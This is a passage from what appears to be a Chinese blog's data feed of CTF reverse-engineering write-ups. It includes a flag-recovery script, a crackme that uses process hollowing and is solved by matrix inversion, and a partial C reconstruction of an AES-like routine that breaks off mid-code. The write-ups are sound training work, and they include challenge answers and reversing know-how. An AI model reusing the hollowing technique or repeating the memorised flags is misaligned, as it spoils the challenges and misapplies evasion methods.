sum[j][1]); &#125; char* flag = (char*)&amp;encFlag[2]; printf(&quot;flag is L3HCTF&#123;D%s \\n&quot;, flag); return 0;&#125;// L3HCTF&#123;D0uBle_vM_W1th_dOubIe_TEA&#125; LoadIDA打开程序分析 进入LOAD_PE函数，就是创建了个傀儡进程 在ResumeThread这里下断点，dump，然后foremost分离 注意在foremost分离的时候要把dump下来的程序的MZ头抹去，这样才能分离解密后的PE文件来 IDA打开分析 获取flag后，对flag中的字符在 0x30-0x39或 a-f 范围做了个小处理 12340x30 - 0x39 ---&gt; 0x00 - 0x09a - f ---&gt; 0xA ---0xF# 然后假设输入的是123f --&gt; 0x12, 0x3f 存在了0x434380的位置 注意这里全是对应的十六进制，猜测输入的flag的范围就是[0-9a-f] 最终434380处的数据是13个。下面又分为9 + 4 个，正好是3和2的平方，并且下面验证的时候也是分为9 + 4进行验证的 猜测是3 * 3 + 2 * 2的某个矩阵运算, 在上述图89行位置下断点，修改src处的数据为100010001, 12341 0 00 1 00 0 1正好是单位矩阵 然后运行，加密后发现Src处的数据没变，但是v29处的数据全乱了，猜测是逆矩阵 提取出加密后Src 和 v29处的数据 12345678Src: 1 0 -90 -1 -6-1 -2 -4 v29:7 330 13 写脚本求逆矩阵，并转换为flag 12345678910111213141516171819import numpyif __name__ == &quot;__main__&quot;: a = numpy.array([[1, 0, -9], [0, -1, -6], [-1, -2, -4]]) b = numpy.array([[7, 3], [30, 13]]) a_inv = numpy.linalg.inv(a) b_inv = numpy.linalg.inv(b) a_list = [list(i) for i in a_inv] b_list = [list(i) for i in b_inv] flag_list = a_list[0] + a_list[1] + a_list[2] + b_list[0] + b_list[1] flag_list = [int(i) &amp; 0xff for i in flag_list] flag = bytes(flag_list).hex() print(flag) # f812f706f306ff02ff0dfde207 拼接后进行验证，Load.exe在 ResumeThread那里下断点，输入flag，程序断下，在运行dump提取出来的exe，验证成功 最终flag为 : flag&#123;f812f706f306ff02ff0dfde207&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"vm","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"}]},{"title":"2021强网拟态_babyre","slug":"2021强网拟态_babyre","date":"2021-11-11T16:00:00.000Z","updated":"2021-11-29T11:42:10.176Z","comments":true,"path":"2021/11/12/2021强网拟态_babyre/","link":"","permalink":"https://zzzzsky.github.io/2021/11/12/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_babyre/","excerpt":"","text":"2021强网拟态rebabyreIDA动态调试，进入关键函数 分析函数，提取数据，还原算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;stdio.h&gt;typedef unsigned char BYTE;typedef unsigned long DWORD;char _flag[] = &quot;1234567890123456&quot;;DWORD cmp_data[8] = &#123;0xE82BA79E, 0x83EA91DE, 0x241BCCFE, 0x2836973B, 0x5F86C92D, 0x0C8094E88, 0x0FEC81BB0, 0x0D5277623&#125;;DWORD key[60] = &#123;0xc3bb95b, 0x578c9d63, 0x7faca21c, 0x29522e93, 0xb268681, 0xda705e01, 0xa7732a53, 0x72e0c013, 0x4b4fcf3b, 0xe46963a6, 0x3eeea9d2, 0xefb38fbb, 0xd156d880, 0x7d037452, 0xd593ea40, 0xd5223126, 0xaf26ac9d, 0xda87ca74, 0xd15d2669, 0x6cadaad, 0xac55acd2, 0xa8909e12, 0xb1db66, 0xcc4c1870, 0x75a166e9, 0xbdaec1d, 0xd797fcc4, 0x9cd3659b, 0x4c532c0, 0xa8214574, 0xccfdc316, 0x6019b4a2, 0x7e7b8af4, 0xdc4d10d9, 0x4b44995f, 0x2ca5c858, 0xace477b4, 0x64dc8662, 0xace477b4, 0xbbc35df5, 0xa2369a2d, 0x97098986, 0x67e15107, 0xfd0b6e21, 0xc838f1d6, 0xc838f1d6, 0x17272a41, 0x38f9ff4a, 0x353f13ab, 0xf0e8d881, 0x9aea3f26, 0x5f3df40c, 0x0, 0xdf1fdb97, 0x2fded50b, 0x49b04218, 0xf3000000, 0xc3fa1e0f, 0xf3000000, 0x841f&#125;;DWORD dword_405420[256] = &#123;0xa7f45150, 0x65417e53, 0xa4171ac3, 0x5e273a96, 0x6bab3bcb, 0x459d1ff1, 0x58faacab, 0x3e34b93, 0xfa302055, 0x6d76adf6, 0x76cc8891, 0x4c02f525, 0xd7e54ffc, 0xcb2ac5d7, 0x44352680, 0xa362b58f, 0x5ab1de49, 0x1bba2567, 0xeea4598, 0xc0fe5de1, 0x752fc302, 0xf04c8112, 0x97468da3, 0xf9d36bc6, 0x5f8f03e7, 0x9c921595, 0x7a6dbfeb, 0x595295da, 0x83bed42d, 0x217458d3, 0x69e04929, 0xc8c98e44, 0x89c2756a, 0x798ef478, 0x3e58996b, 0x71b927dd, 0x4fe1beb6, 0xad88f017, 0xac20c966, 0x3ace7db4, 0x4adf6318, 0x311ae582, 0x33519760, 0x7f536245, 0x7764b1e0, 0xae6bbb84, 0xa081fe1c, 0x2b08f994, 0x68487058, 0xfd458f19, 0x6cde9487, 0xf87b52b7, 0xd373ab23, 0x24b72e2, 0x8f1fe357, 0xab55662a, 0x28ebb207, 0xc2b52f03, 0x7bc5869a, 0x837d3a5, 0x872830f2, 0xa5bf23b2, 0x6a0302ba, 0x8216ed5c, 0x1ccf8a2b, 0xb479a792, 0xf207f3f0, 0xe2694ea1, 0xf4da65cd, 0xbe0506d5, 0x6234d11f, 0xfea6c48a, 0x532e349d, 0x55f3a2a0, 0xe18a0532, 0xebf6a475, 0xec830b39, 0xef6040aa, 0x9f715e06, 0x106ebd51, 0x8a213ef9, 0x6dd963d, 0x53eddae, 0xbde64d46, 0x8d5491b5, 0x5dc47105, 0xd406046f, 0x155060ff, 0xfb981924, 0xe9bdd697, 0x434089cc, 0x9ed96777, 0x42e8b0bd, 0x8b890788, 0x5b19e738, 0xeec879db, 0xa7ca147, 0xf427ce9, 0x1e84f8c9, 0x0, 0x86800983, 0xed2b3248, 0x70111eac, 0x725a6c4e, 0xff0efdfb, 0x38850f56, 0xd5ae3d1e, 0x392d3627, 0xd90f0a64, 0xa65c6821, 0x545b9bd1, 0x2e36243a, 0x670a0cb1, 0xe757930f, 0x96eeb4d2, 0x919b1b9e, 0xc5c0804f, 0x20dc61a2, 0x4b775a69, 0x1a121c16, 0xba93e20a, 0x2aa0c0e5, 0xe0223c43, 0x171b121d, 0xd090e0b, 0xc78bf2ad, 0xa8b62db9, 0xa91e14c8, 0x19f15785, 0x775af4c, 0xdd99eebb, 0x607fa3fd, 0x2601f79f, 0xf5725cbc, 0x3b6644c5, 0x7efb5b34, 0x29438b76, 0xc623cbdc, 0xfcedb668, 0xf1e4b863, 0xdc31d7ca, 0x85634210, 0x22971340, 0x11c68420, 0x244a857d, 0x3dbbd2f8, 0x32f9ae11, 0xa129c76d, 0x2f9e1d4b, 0x30b2dcf3, 0x52860dec, 0xe3c177d0, 0x16b32b6c, 0xb970a999, 0x489411fa, 0x64e94722, 0x8cfca8c4, 0x3ff0a01a, 0x2c7d56d8, 0x903322ef, 0x4e4987c7, 0xd138d9c1, 0xa2ca8cfe, 0xbd49836, 0x81f5a6cf, 0xde7aa528, 0x8eb7da26, 0xbfad3fa4, 0x9d3a2ce4, 0x9278500d, 0xcc5f6a9b, 0x467e5462, 0x138df6c2, 0xb8d890e8, 0xf7392e5e, 0xafc382f5, 0x805d9fbe, 0x93d0697c, 0x2dd56fa9, 0x1225cfb3, 0x99acc83b, 0x7d1810a7, 0x639ce86e, 0xbb3bdb7b, 0x7826cd09, 0x18596ef4, 0xb79aec01, 0x9a4f83a8, 0x6e95e665, 0xe6ffaa7e, 0xcfbc2108, 0xe815efe6, 0x9be7bad9, 0x366f4ace, 0x99fead4, 0x7cb029d6, 0xb2a431af, 0x233f2a31, 0x94a5c630, 0x66a235c0, 0xbc4e7437, 0xca82fca6, 0xd090e0b0, 0xd8a73315, 0x9804f14a, 0xdaec41f7, 0x50cd7f0e, 0xf691172f, 0xd64d768d, 0xb0ef434d, 0x4daacc54, 0x496e4df, 0xb5d19ee3, 0x886a4c1b, 0x1f2cc1b8, 0x5165467f, 0xea5e9d04, 0x358c015d, 0x7487fa73, 0x410bfb2e, 0x1d67b35a, 0xd2db9252, 0x5610e933, 0x47d66d13, 0x61d79a8c, 0xca1377a, 0x14f8598e, 0x3c13eb89, 0x27a9ceee, 0xc961b735, 0xe51ce1ed, 0xb1477a3c, 0xdfd29c59, 0x73f2553f, 0xce141879, 0x37c773bf, 0xcdf753ea, 0xaafd5f5b, 0x6f3ddf14, 0xdb447886, 0xf3afca81, 0xc468b93e, 0x3424382c, 0x40a3c25f, 0xc31d1672, 0x25e2bc0c, 0x493c288b, 0x950dff41, 0x1a83971, 0xb30c08de, 0xe4b4d89c, 0xc1566490, 0x84cb7b61, 0xb632d570, 0x5c6c4874, 0x57b8d042&#125;;DWORD dword_405820[256] = &#123;0xf45150a7, 0x417e5365, 0x171ac3a4, 0x273a965e, 0xab3bcb6b, 0x9d1ff145, 0xfaacab58, 0xe34b9303, 0x302055fa, 0x76adf66d, 0xcc889176, 0x2f5254c, 0xe54ffcd7, 0x2ac5d7cb, 0x35268044, 0x62b58fa3, 0xb1de495a, 0xba25671b, 0xea45980e, 0xfe5de1c0, 0x2fc30275, 0x4c8112f0, 0x468da397, 0xd36bc6f9, 0x8f03e75f, 0x9215959c, 0x6dbfeb7a, 0x5295da59, 0xbed42d83, 0x7458d321, 0xe0492969, 0xc98e44c8, 0xc2756a89, 0x8ef47879, 0x58996b3e, 0xb927dd71, 0xe1beb64f, 0x88f017ad, 0x20c966ac, 0xce7db43a, 0xdf63184a, 0x1ae58231, 0x51976033, 0x5362457f, 0x64b1e077, 0x6bbb84ae, 0x81fe1ca0, 0x8f9942b, 0x48705868, 0x458f19fd, 0xde94876c, 0x7b52b7f8, 0x73ab23d3, 0x4b72e202, 0x1fe3578f, 0x55662aab, 0xebb20728, 0xb52f03c2, 0xc5869a7b, 0x37d3a508, 0x2830f287, 0xbf23b2a5, 0x302ba6a, 0x16ed5c82, 0xcf8a2b1c, 0x79a792b4, 0x7f3f0f2, 0x694ea1e2, 0xda65cdf4, 0x506d5be, 0x34d11f62, 0xa6c48afe, 0x2e349d53, 0xf3a2a055, 0x8a0532e1, 0xf6a475eb, 0x830b39ec, 0x6040aaef, 0x715e069f, 0x6ebd5110, 0x213ef98a, 0xdd963d06, 0x3eddae05, 0xe64d46bd, 0x5491b58d, 0xc471055d, 0x6046fd4, 0x5060ff15, 0x981924fb, 0xbdd697e9, 0x4089cc43, 0xd967779e, 0xe8b0bd42, 0x8907888b, 0x19e7385b, 0xc879dbee, 0x7ca1470a, 0x427ce90f, 0x84f8c91e, 0x0, 0x80098386, 0x2b3248ed, 0x111eac70, 0x5a6c4e72, 0xefdfbff, 0x850f5638, 0xae3d1ed5, 0x2d362739, 0xf0a64d9, 0x5c6821a6, 0x5b9bd154, 0x36243a2e, 0xa0cb167, 0x57930fe7, 0xeeb4d296, 0x9b1b9e91, 0xc0804fc5, 0xdc61a220, 0x775a694b, 0x121c161a, 0x93e20aba, 0xa0c0e52a, 0x223c43e0, 0x1b121d17, 0x90e0b0d, 0x8bf2adc7, 0xb62db9a8, 0x1e14c8a9, 0xf1578519, 0x75af4c07, 0x99eebbdd, 0x7fa3fd60, 0x1f79f26, 0x725cbcf5, 0x6644c53b, 0xfb5b347e, 0x438b7629, 0x23cbdcc6, 0xedb668fc, 0xe4b863f1, 0x31d7cadc, 0x63421085, 0x97134022, 0xc6842011, 0x4a857d24, 0xbbd2f83d, 0xf9ae1132, 0x29c76da1, 0x9e1d4b2f, 0xb2dcf330, 0x860dec52, 0xc177d0e3, 0xb32b6c16, 0x70a999b9, 0x9411fa48, 0xe9472264, 0xfca8c48c, 0xf0a01a3f, 0x7d56d82c, 0x3322ef90, 0x4987c74e, 0x38d9c1d1, 0xca8cfea2, 0xd498360b, 0xf5a6cf81, 0x7aa528de, 0xb7da268e, 0xad3fa4bf, 0x3a2ce49d, 0x78500d92, 0x5f6a9bcc, 0x7e546246, 0x8df6c213, 0xd890e8b8, 0x392e5ef7, 0xc382f5af, 0x5d9fbe80, 0xd0697c93, 0xd56fa92d, 0x25cfb312, 0xacc83b99, 0x1810a77d, 0x9ce86e63, 0x3bdb7bbb, 0x26cd0978, 0x596ef418, 0x9aec01b7, 0x4f83a89a, 0x95e6656e, 0xffaa7ee6, 0xbc2108cf, 0x15efe6e8, 0xe7bad99b, 0x6f4ace36, 0x9fead409, 0xb029d67c, 0xa431afb2, 0x3f2a3123, 0xa5c63094, 0xa235c066, 0x4e7437bc, 0x82fca6ca, 0x90e0b0d0, 0xa73315d8, 0x4f14a98, 0xec41f7da, 0xcd7f0e50, 0x91172ff6, 0x4d768dd6, 0xef434db0, 0xaacc544d, 0x96e4df04, 0xd19ee3b5, 0x6a4c1b88, 0x2cc1b81f, 0x65467f51, 0x5e9d04ea, 0x8c015d35, 0x87fa7374, 0xbfb2e41, 0x67b35a1d, 0xdb9252d2, 0x10e93356, 0xd66d1347, 0xd79a8c61, 0xa1377a0c, 0xf8598e14, 0x13eb893c, 0xa9ceee27, 0x61b735c9, 0x1ce1ede5, 0x477a3cb1, 0xd29c59df, 0xf2553f73, 0x141879ce, 0xc773bf37, 0xf753eacd, 0xfd5f5baa, 0x3ddf146f, 0x447886db, 0xafca81f3, 0x68b93ec4, 0x24382c34, 0xa3c25f40, 0x1d1672c3, 0xe2bc0c25, 0x3c288b49, 0xdff4195, 0xa8397101, 0xc08deb3, 0xb4d89ce4, 0x566490c1, 0xcb7b6184, 0x32d570b6, 0x6c48745c, 0xb8d04257&#125;;DWORD dword_405C20[256] = &#123;0x5150a7f4, 0x7e536541, 0x1ac3a417, 0x3a965e27, 0x3bcb6bab, 0x1ff1459d, 0xacab58fa, 0x4b9303e3, 0x2055fa30, 0xadf66d76, 0x889176cc, 0xf5254c02, 0x4ffcd7e5, 0xc5d7cb2a, 0x26804435, 0xb58fa362, 0xde495ab1, 0x25671bba, 0x45980eea, 0x5de1c0fe, 0xc302752f, 0x8112f04c, 0x8da39746, 0x6bc6f9d3, 0x3e75f8f, 0x15959c92, 0xbfeb7a6d, 0x95da5952, 0xd42d83be, 0x58d32174, 0x492969e0, 0x8e44c8c9, 0x756a89c2, 0xf478798e, 0x996b3e58, 0x27dd71b9, 0xbeb64fe1, 0xf017ad88, 0xc966ac20, 0x7db43ace, 0x63184adf, 0xe582311a, 0x97603351, 0x62457f53, 0xb1e07764, 0xbb84ae6b, 0xfe1ca081, 0xf9942b08, 0x70586848, 0x8f19fd45, 0x94876cde, 0x52b7f87b, 0xab23d373, 0x72e2024b, 0xe3578f1f, 0x662aab55, 0xb20728eb, 0x2f03c2b5, 0x869a7bc5, 0xd3a50837, 0x30f28728, 0x23b2a5bf, 0x2ba6a03, 0xed5c8216, 0x8a2b1ccf, 0xa792b479, 0xf3f0f207, 0x4ea1e269, 0x65cdf4da, 0x6d5be05, 0xd11f6234, 0xc48afea6, 0x349d532e, 0xa2a055f3, 0x532e18a, 0xa475ebf6, 0xb39ec83, 0x40aaef60, 0x5e069f71, 0xbd51106e, 0x3ef98a21, 0x963d06dd, 0xddae053e, 0x4d46bde6, 0x91b58d54, 0x71055dc4, 0x46fd406, 0x60ff1550, 0x1924fb98, 0xd697e9bd, 0x89cc4340, 0x67779ed9, 0xb0bd42e8, 0x7888b89, 0xe7385b19, 0x79dbeec8, 0xa1470a7c, 0x7ce90f42, 0xf8c91e84, 0x0, 0x9838680, 0x3248ed2b, 0x1eac7011, 0x6c4e725a, 0xfdfbff0e, 0xf563885, 0x3d1ed5ae, 0x3627392d, 0xa64d90f, 0x6821a65c, 0x9bd1545b, 0x243a2e36, 0xcb1670a, 0x930fe757, 0xb4d296ee, 0x1b9e919b, 0x804fc5c0, 0x61a220dc, 0x5a694b77, 0x1c161a12, 0xe20aba93, 0xc0e52aa0, 0x3c43e022, 0x121d171b, 0xe0b0d09, 0xf2adc78b, 0x2db9a8b6, 0x14c8a91e, 0x578519f1, 0xaf4c0775, 0xeebbdd99, 0xa3fd607f, 0xf79f2601, 0x5cbcf572, 0x44c53b66, 0x5b347efb, 0x8b762943, 0xcbdcc623, 0xb668fced, 0xb863f1e4, 0xd7cadc31, 0x42108563, 0x13402297, 0x842011c6, 0x857d244a, 0xd2f83dbb, 0xae1132f9, 0xc76da129, 0x1d4b2f9e, 0xdcf330b2, 0xdec5286, 0x77d0e3c1, 0x2b6c16b3, 0xa999b970, 0x11fa4894, 0x472264e9, 0xa8c48cfc, 0xa01a3ff0, 0x56d82c7d, 0x22ef9033, 0x87c74e49, 0xd9c1d138, 0x8cfea2ca, 0x98360bd4, 0xa6cf81f5, 0xa528de7a, 0xda268eb7, 0x3fa4bfad, 0x2ce49d3a, 0x500d9278, 0x6a9bcc5f, 0x5462467e, 0xf6c2138d, 0x90e8b8d8, 0x2e5ef739, 0x82f5afc3, 0x9fbe805d, 0x697c93d0, 0x6fa92dd5, 0xcfb31225, 0xc83b99ac, 0x10a77d18, 0xe86e639c, 0xdb7bbb3b, 0xcd097826, 0x6ef41859, 0xec01b79a, 0x83a89a4f, 0xe6656e95, 0xaa7ee6ff, 0x2108cfbc, 0xefe6e815, 0xbad99be7, 0x4ace366f, 0xead4099f, 0x29d67cb0, 0x31afb2a4, 0x2a31233f, 0xc63094a5, 0x35c066a2, 0x7437bc4e, 0xfca6ca82, 0xe0b0d090, 0x3315d8a7, 0xf14a9804, 0x41f7daec, 0x7f0e50cd, 0x172ff691, 0x768dd64d, 0x434db0ef, 0xcc544daa, 0xe4df0496, 0x9ee3b5d1, 0x4c1b886a, 0xc1b81f2c, 0x467f5165, 0x9d04ea5e, 0x15d358c, 0xfa737487, 0xfb2e410b, 0xb35a1d67, 0x9252d2db, 0xe9335610, 0x6d1347d6, 0x9a8c61d7, 0x377a0ca1, 0x598e14f8, 0xeb893c13, 0xceee27a9, 0xb735c961, 0xe1ede51c, 0x7a3cb147, 0x9c59dfd2, 0x553f73f2, 0x1879ce14, 0x73bf37c7, 0x53eacdf7, 0x5f5baafd, 0xdf146f3d, 0x7886db44, 0xca81f3af, 0xb93ec468, 0x382c3424, 0xc25f40a3, 0x1672c31d, 0xbc0c25e2, 0x288b493c, 0xff41950d, 0x397101a8, 0x8deb30c, 0xd89ce4b4, 0x6490c156, 0x7b6184cb, 0xd570b632, 0x48745c6c, 0xd04257b8&#125;;DWORD dword_405020[256] = &#123;0x50a7f451, 0x5365417e, 0xc3a4171a, 0x965e273a, 0xcb6bab3b, 0xf1459d1f, 0xab58faac, 0x9303e34b, 0x55fa3020, 0xf66d76ad, 0x9176cc88, 0x254c02f5, 0xfcd7e54f, 0xd7cb2ac5, 0x80443526, 0x8fa362b5, 0x495ab1de, 0x671bba25, 0x980eea45, 0xe1c0fe5d, 0x2752fc3, 0x12f04c81, 0xa397468d, 0xc6f9d36b, 0xe75f8f03, 0x959c9215, 0xeb7a6dbf, 0xda595295, 0x2d83bed4, 0xd3217458, 0x2969e049, 0x44c8c98e, 0x6a89c275, 0x78798ef4, 0x6b3e5899, 0xdd71b927, 0xb64fe1be, 0x17ad88f0, 0x66ac20c9, 0xb43ace7d, 0x184adf63, 0x82311ae5, 0x60335197, 0x457f5362, 0xe07764b1, 0x84ae6bbb, 0x1ca081fe, 0x942b08f9, 0x58684870, 0x19fd458f, 0x876cde94, 0xb7f87b52, 0x23d373ab, 0xe2024b72, 0x578f1fe3, 0x2aab5566, 0x728ebb2, 0x3c2b52f, 0x9a7bc586, 0xa50837d3, 0xf2872830, 0xb2a5bf23, 0xba6a0302, 0x5c8216ed, 0x2b1ccf8a, 0x92b479a7, 0xf0f207f3, 0xa1e2694e, 0xcdf4da65, 0xd5be0506, 0x1f6234d1, 0x8afea6c4, 0x9d532e34, 0xa055f3a2, 0x32e18a05, 0x75ebf6a4, 0x39ec830b, 0xaaef6040, 0x69f715e, 0x51106ebd, 0xf98a213e, 0x3d06dd96, 0xae053edd, 0x46bde64d, 0xb58d5491, 0x55dc471, 0x6fd40604, 0xff155060, 0x24fb9819, 0x97e9bdd6, 0xcc434089, 0x779ed967, 0xbd42e8b0, 0x888b8907, 0x385b19e7, 0xdbeec879, 0x470a7ca1, 0xe90f427c, 0xc91e84f8, 0x0, 0x83868009, 0x48ed2b32, 0xac70111e, 0x4e725a6c, 0xfbff0efd, 0x5638850f, 0x1ed5ae3d, 0x27392d36, 0x64d90f0a, 0x21a65c68, 0xd1545b9b, 0x3a2e3624, 0xb1670a0c, 0xfe75793, 0xd296eeb4, 0x9e919b1b, 0x4fc5c080, 0xa220dc61, 0x694b775a, 0x161a121c, 0xaba93e2, 0xe52aa0c0, 0x43e0223c, 0x1d171b12, 0xb0d090e, 0xadc78bf2, 0xb9a8b62d, 0xc8a91e14, 0x8519f157, 0x4c0775af, 0xbbdd99ee, 0xfd607fa3, 0x9f2601f7, 0xbcf5725c, 0xc53b6644, 0x347efb5b, 0x7629438b, 0xdcc623cb, 0x68fcedb6, 0x63f1e4b8, 0xcadc31d7, 0x10856342, 0x40229713, 0x2011c684, 0x7d244a85, 0xf83dbbd2, 0x1132f9ae, 0x6da129c7, 0x4b2f9e1d, 0xf330b2dc, 0xec52860d, 0xd0e3c177, 0x6c16b32b, 0x99b970a9, 0xfa489411, 0x2264e947, 0xc48cfca8, 0x1a3ff0a0, 0xd82c7d56, 0xef903322, 0xc74e4987, 0xc1d138d9, 0xfea2ca8c, 0x360bd498, 0xcf81f5a6, 0x28de7aa5, 0x268eb7da, 0xa4bfad3f, 0xe49d3a2c, 0xd927850, 0x9bcc5f6a, 0x62467e54, 0xc2138df6, 0xe8b8d890, 0x5ef7392e, 0xf5afc382, 0xbe805d9f, 0x7c93d069, 0xa92dd56f, 0xb31225cf, 0x3b99acc8, 0xa77d1810, 0x6e639ce8, 0x7bbb3bdb, 0x97826cd, 0xf418596e, 0x1b79aec, 0xa89a4f83, 0x656e95e6, 0x7ee6ffaa, 0x8cfbc21, 0xe6e815ef, 0xd99be7ba, 0xce366f4a, 0xd4099fea, 0xd67cb029, 0xafb2a431, 0x31233f2a, 0x3094a5c6, 0xc066a235, 0x37bc4e74, 0xa6ca82fc, 0xb0d090e0, 0x15d8a733, 0x4a9804f1, 0xf7daec41, 0xe50cd7f, 0x2ff69117, 0x8dd64d76, 0x4db0ef43, 0x544daacc, 0xdf0496e4, 0xe3b5d19e, 0x1b886a4c, 0xb81f2cc1, 0x7f516546, 0x4ea5e9d, 0x5d358c01, 0x737487fa, 0x2e410bfb, 0x5a1d67b3, 0x52d2db92, 0x335610e9, 0x1347d66d, 0x8c61d79a, 0x7a0ca137, 0x8e14f859, 0x893c13eb, 0xee27a9ce, 0x35c961b7, 0xede51ce1, 0x3cb1477a, 0x59dfd29c, 0x3f73f255, 0x79ce1418, 0xbf37c773, 0xeacdf753, 0x5baafd5f, 0x146f3ddf, 0x86db4478, 0x81f3afca, 0x3ec468b9, 0x2c342438, 0x5f40a3c2, 0x72c31d16, 0xc25e2bc, 0x8b493c28, 0x41950dff, 0x7101a839, 0xdeb30c08, 0x9ce4b4d8, 0x90c15664, 0x6184cb7b, 0x70b632d5, 0x745c6c48, 0x4257b8d0&#125;;BYTE RijnDael_AES_LONG_inv_406120[256] = &#123;0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;BYTE BYTE1(DWORD _data)&#123; return (_data &gt;&gt; 8) &amp; 0XFF;&#125;BYTE BYTE2(DWORD _data)&#123; return (_data &gt;&gt; 16) &amp; 0XFF;&#125;BYTE HIBYTE(DWORD _data)&#123; return (_data &gt;&gt; 24) &amp; 0XFF;&#125;BYTE BYTE0(DWORD _data)&#123; return _data &amp; 0XFF;&#125;DWORD _enc_flag[4] = &#123;0&#125;;int main()&#123; DWORD *flag = (DWORD *)_flag; int key_index = 0; DWORD v9 = 0, v8 = 0, v7 = 0, i = 0; DWORD v11 = 0, v13 = 0, v15 = 0, v17 = 0; DWORD v12 = 0, v14 = 0, v16 = 0, v18 = 0; v9 = flag[3] ^ key[key_index]; key_index += 1; v8 = flag[2] ^ key[key_index]; key_index += 1; v7 = flag[1] ^ key[key_index]; key_index += 1; i = flag[0] ^ key[key_index]; key_index += 1; for (int j = 0; j &lt; 13; j++) &#123; v11 = dword_405420[BYTE1(v9)] ^ dword_405820[BYTE2(v8)] ^ dword_405C20[HIBYTE(v7)] ^ dword_405020[BYTE0(i)]; v13 = dword_405420[BYTE1(i)] ^ dword_405820[BYTE2(v9)] ^ dword_405C20[HIBYTE(v8)] ^ dword_405020[BYTE0(v7)]; v15 = dword_405420[BYTE1(v7)] ^ dword_405820[BYTE2(i)] ^ dword_405C20[HIBYTE(v9)] ^ dword_405020[BYTE0(v8)]; v17 = dword_405420[BYTE1(v8)] ^ dword_405820[BYTE2(v7)] ^ dword_405C20[HIBYTE(i)] ^ dword_405020[BYTE0(v9)]; //最后一轮时 V11, V13, V15, V17的值应该如下 // v11 = 0xf048c314; // v13 = 0xb4db6016; // v15 = 0x8eee5336; // v17 = 0x948726e2; v9 = v17 ^ key[key_index]; key_index += 1; v8 = v15 ^ key[key_index]; key_index += 1; v7 = v13 ^ key[key_index]; key_index += 1; i = v11 ^ key[key_index]; key_index += 1; &#125; //运行到这里，v9, v8, v7, i的数据应该如下 // v9 = 0x948726e2; // v8 = 0x51f188a1; // v7 = 0x9b05b51d; // i = 0xb9f8810c; v12 = (RijnDael_AES_LONG_inv_406120[BYTE1(v9)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v8)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v7)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(i)]; v14 = (RijnDael_AES_LONG_inv_406120[BYTE1(i)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v9)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v8)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(v7)]; v16 = (RijnDael_AES_LONG_inv_406120[BYTE1(v7)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(i)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(v9)] &lt;&lt; 24) | RijnDael_AES_LONG_inv_406120[BYTE0(v8)]; v18 = (RijnDael_AES_LONG_inv_406120[BYTE1(v8)] &lt;&lt; 8) | (RijnDael_AES_LONG_inv_406120[BYTE2(v7)] &lt;&lt; 16) | (RijnDael_AES_LONG_inv_406120[HIBYTE(i)] &lt;&lt; 24) | 